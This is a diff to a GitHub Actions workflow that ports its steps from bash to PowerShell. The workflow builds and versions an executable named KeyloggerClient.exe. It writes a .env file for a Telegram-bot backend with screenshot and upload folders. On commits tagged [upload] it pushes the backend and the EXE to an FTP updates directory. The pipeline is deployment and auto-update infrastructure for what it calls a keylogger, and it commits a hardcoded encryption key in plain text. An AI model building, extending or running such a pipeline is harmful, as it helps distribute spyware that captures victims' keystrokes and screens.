@@ -58,46 +58,53 @@ jobs:
         }
     
     - name: Rename built EXE by version
-      shell: bash
+      shell: powershell
       run: |
-        VERSION="${{ secrets.CLIENT_VERSION }}"
-        RENAMED="version_${VERSION//./_}.exe"
-        mv dist/KeyloggerClient.exe dist/$RENAMED
-        echo "RENAMED_FILE=$RENAMED" >> $GITHUB_ENV
-        echo "Renamed to: $RENAMED"
-        ls -lh dist/$RENAMED
+        $version = "${{ secrets.CLIENT_VERSION }}"
+        $renamed = "version_$($version -replace '\.', '_').exe"
+        Rename-Item -Path "dist/KeyloggerClient.exe" -NewName $renamed
+        Write-Output "RENAMED_FILE=$renamed" >> $env:GITHUB_ENV
+        Write-Output "Renamed to: $renamed"
+        Get-Item -Path "dist/$renamed" | Format-Table -AutoSize
+    
+    - name: Debug environment variables
+      shell: powershell
+      run: |
+        Write-Output "RENAMED_FILE: ${{ env.RENAMED_FILE }}"
     
     - name: Generate .env file from secrets
-      shell: bash
+      shell: powershell
       run: |
-        mkdir -p telegram/log telegram/uploads telegram/screenshots
-        cat > telegram/.env << EOF
-        BASE_URL=${{ secrets.BASE_URL }}
-        SERVER_URL=${{ secrets.BASE_URL }}/api.php
-        BOT_TOKEN=${{ secrets.BOT_TOKEN }}
-        WEBHOOK_SECRET=${{ secrets.WEBHOOK_SECRET }}
-        ADMIN_CHAT_ID=${{ secrets.ADMIN_CHAT_ID }}
-        DB_HOST=${{ secrets.DB_HOST }}
-        DB_NAME=${{ secrets.DB_NAME }}
-        DB_USER=${{ secrets.DB_USER }}
-        DB_PASS=${{ secrets.DB_PASS }}
-        SECRET_TOKEN=1
-        ENCRYPTION_KEY=nTds2GHvEWeOGJibjZuaf8kY5T5YWyfMx4J3B1NA0Jo=
-        CLIENT_VERSION=${{ secrets.CLIENT_VERSION }}
-        EOF
-        echo ".env file created successfully"
+        New-Item -ItemType Directory -Force -Path telegram/log,telegram/uploads,telegram/screenshots
+        $envContent = @(
+          "BASE_URL=${{ secrets.BASE_URL }}",
+          "SERVER_URL=${{ secrets.BASE_URL }}/api.php",
+          "BOT_TOKEN=${{ secrets.BOT_TOKEN }}",
+          "WEBHOOK_SECRET=${{ secrets.WEBHOOK_SECRET }}",
+          "ADMIN_CHAT_ID=${{ secrets.ADMIN_CHAT_ID }}",
+          "DB_HOST=${{ secrets.DB_HOST }}",
+          "DB_NAME=${{ secrets.DB_NAME }}",
+          "DB_USER=${{ secrets.DB_USER }}",
+          "DB_PASS=${{ secrets.DB_PASS }}",
+          "SECRET_TOKEN=1",
+          "ENCRYPTION_KEY=nTds2GHvEWeOGJibjZuaf8kY5T5YWyfMx4J3B1NA0Jo=",
+          "CLIENT_VERSION=${{ secrets.CLIENT_VERSION }}"
+        ) -join "`n"
+        Set-Content -Path telegram/.env -Value $envContent
+        Write-Output ".env file created successfully"
     
     - name: Check if commit includes [upload]
       id: check_upload
-      shell: bash
+      shell: powershell
       run: |
-        if git log -1 --pretty=%B | grep -iq "\[upload\]"; then
-          echo "upload=true" >> $GITHUB_OUTPUT
-          echo "Upload flag detected in commit message"
-        else
-          echo "upload=false" >> $GITHUB_OUTPUT
-          echo "No upload flag in commit message"
-        fi
+        $commitMessage = git log -1 --pretty=%B
+        if ($commitMessage -match "\[upload\]") {
+          Write-Output "upload=true" >> $env:GITHUB_OUTPUT
+          Write-Output "Upload flag detected in commit message"
+        } else {
+          Write-Output "upload=false" >> $env:GITHUB_OUTPUT
+          Write-Output "No upload flag in commit message"
+        }
     
     - name: Upload Telegram PHP to FTP
       if: steps.check_upload.outputs.upload == 'true'
@@ -117,41 +124,44 @@ jobs:
     
     - name: Create updates directory on FTP
       if: steps.check_upload.outputs.upload == 'true'
-      shell: bash
+      shell: powershell
       run: |
-        echo "Creating updates directory..."
-        curl --ftp-create-dirs \
-          --user "${{ secrets.FTP_USERNAME }}:${{ secrets.FTP_PASSWORD }}" \
-          "ftp://${{ secrets.FTP_HOST }}${{ secrets.FTP_PATH }}/updates/" \
-          -Q "MKD updates" || echo "Directory might already exist"
+        Write-Output "Creating updates directory..."
+        curl --ftp-create-dirs `
+          --user "${{ secrets.FTP_USERNAME }}:${{ secrets.FTP_PASSWORD }}" `
+          "ftp://${{ secrets.FTP_HOST }}${{ secrets.FTP_PATH }}/updates/" `
+          -Q "MKD updates" || Write-Output "Directory might already exist"
     
     - name: Upload built EXE to FTP /updates/
       if: steps.check_upload.outputs.upload == 'true'
-      shell: bash
+      shell: powershell
       run: |
-        echo "Uploading $RENAMED_FILE to FTP..."
-        FILE_SIZE=$(stat -c%s "dist/$RENAMED_FILE" 2>/dev/null || stat -f%z "dist/$RENAMED_FILE")
-        FILE_SIZE_MB=$(echo "scale=2; $FILE_SIZE / 1048576" | bc)
-        echo "File size: ${FILE_SIZE_MB} MB"
-        
-        curl -T "dist/$RENAMED_FILE" \
-          --user "${{ secrets.FTP_USERNAME }}:${{ secrets.FTP_PASSWORD }}" \
-          --ftp-create-dirs \
-          --progress-bar \
-          "ftp://${{ secrets.FTP_HOST }}${{ secrets.FTP_PATH }}/updates/$RENAMED_FILE"
-        
-        echo "Upload completed!"
+        $renamedFile = "${{ env.RENAMED_FILE }}"
+        Write-Output "Uploading $renamedFile to FTP..."
+        $fileSize = (Get-Item "dist/$renamedFile").Length
+        $fileSizeMB = [math]::Round($fileSize / 1MB, 2)
+        Write-Output "File size: $fileSizeMB MB"
+        curl -T "dist/$renamedFile" `
+          --user "${{ secrets.FTP_USERNAME }}:${{ secrets.FTP_PASSWORD }}" `
+          --ftp-create-dirs `
+          --progress-bar `
+          "ftp://${{ secrets.FTP_HOST }}${{ secrets.FTP_PATH }}/updates/$renamedFile"
+        Write-Output "Upload completed!"
     
     - name: Verify FTP upload
       if: steps.check_upload.outputs.upload == 'true'
-      shell: bash
+      shell: powershell
       run: |
-        echo "Verifying uploaded file..."
-        curl --head \
-          --user "${{ secrets.FTP_USERNAME }}:${{ secrets.FTP_PASSWORD }}" \
-          "ftp://${{ secrets.FTP_HOST }}${{ secrets.FTP_PATH }}/updates/$RENAMED_FILE" \
-          && echo "File verified on FTP!" \
-          || echo "WARNING: Could not verify file on FTP"
+        $renamedFile = "${{ env.RENAMED_FILE }}"
+        Write-Output "Verifying uploaded file..."
+        $result = curl --head `
+          --user "${{ secrets.FTP_USERNAME }}:${{ secrets.FTP_PASSWORD }}" `
+          "ftp://${{ secrets.FTP_HOST }}${{ secrets.FTP_PATH }}/updates/$renamedFile"
+        if ($LASTEXITCODE -eq 0) {
+          Write-Output "File verified on FTP!"
+        } else {
+          Write-Output "WARNING: Could not verify file on FTP"
+        }
     
     - name: Upload artifacts
       if: always()
